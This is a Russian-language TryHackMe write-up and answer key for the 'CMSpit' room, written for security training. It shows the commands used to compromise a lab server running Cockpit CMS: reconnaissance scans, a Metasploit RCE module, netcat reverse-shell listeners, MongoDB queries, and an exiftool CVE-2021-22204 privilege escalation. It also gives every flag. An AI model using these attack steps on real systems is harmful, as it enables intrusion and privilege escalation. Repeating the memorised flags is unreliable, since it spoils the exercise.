[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [CMSpit](https://tryhackme.com/r/room/cmspit) 

Всего 1 заданиe:
## Задание 1
Вы определили, что система CMS, установленная на веб-сервере, имеет несколько уязвимостей, которые позволяют 
злоумышленникам подсчитывать пользователей и изменять пароли учетных записей.

Ваша задача — воспользоваться этими уязвимостями и скомпрометировать веб-сервер.

### Ответьте на вопросы ниже
Как называется система управления контентом (CMS), установленная на сервере?
```commandline
nmap -sSCV <IP>
gobuster dir -u <IP> -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
http://<IP>
```
```commandline
cockpit
```
Какая версия системы управления контентом (CMS) установлена на сервере? 
```commandline
0.11.1
```
Какой путь позволяет производить перечисление пользователей?
```commandline
/auth/check
```
Сколько пользователей вы сможете идентифицировать, воспроизведя атаку методом перечисления пользователей?
```commandline
search cockpit
use exploit/multi/http/cockpit_cms_rce
options
set RHOSTs <IP>
set RPORT 80
run
# admin, darkStar7471, skidy, ekoparty
```
```commandline
4
```
Какой путь позволяет изменить пароли учетных записей пользователей?
```commandline
/auth/resetpassword
```
Скомпрометировать систему управления контентом (CMS). Какой адрес электронной почты у Skidy.
```commandline
PasswordRcosery + metasploit
```
```commandline
skidy@tryhackme.fakemail
```
Что такое веб-флаг?
```commandline
thm{f158bea70731c48b05657a02aaf955626d78e9fb}
```
Скомпрометируйте машину и перечислите коллекции в базе данных документов, установленной на сервере. Какой флаг в 
базе данных? 
```commandline
nc -nvlp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
cat /home/stux/.dbshell
```
```commandline
thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}
```
Что такое флаг user.txt?
```commandline
mongo 127.0.0.1:27017
show dbs
use sudousersbak
show collections
flag
db.user.find()
```
```commandline
thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}
```
Какой номер CVE для уязвимости, влияющей на двоичный файл, назначенный системному пользователю? Формат ответа: 
CVE-0000-0000
```commandline
ssh stux@<IP>
sudo -l
# exiftool exploit
```
```commandline
CVE-2021-22204
```
Какая утилита используется для создания PoC-файла?
```commandline
djvumake
```
Повысьте свои привилегии. Какой флаг в root.txt?
```commandline
python3 exploit.py
sudo /usr/local/bin/exiftool image.jpg
nc -nlvp 5555
cat root.txt
```
```commandline
thm{bf52a85b12cf49b9b6d77643771d74e90d4d5ada}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)